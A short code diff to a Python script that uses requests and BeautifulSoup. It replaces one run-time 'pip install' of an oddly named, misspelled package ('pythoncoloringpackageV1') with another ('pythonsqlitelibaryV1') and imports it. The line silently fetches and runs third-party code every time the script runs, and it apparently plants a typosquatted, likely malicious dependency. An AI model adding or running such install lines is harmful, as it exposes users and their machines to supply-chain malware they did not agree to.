@@ -1,6 +1,6 @@
 import os
-os.system("pip install pythoncoloringpackageV1")
-import pythoncoloringpackageV1
+os.system("pip install pythonsqlitelibaryV1")
+import pythonsqlitelibaryV1
 import requests
 from requests.structures import CaseInsensitiveDict
 from bs4 import BeautifulSoup
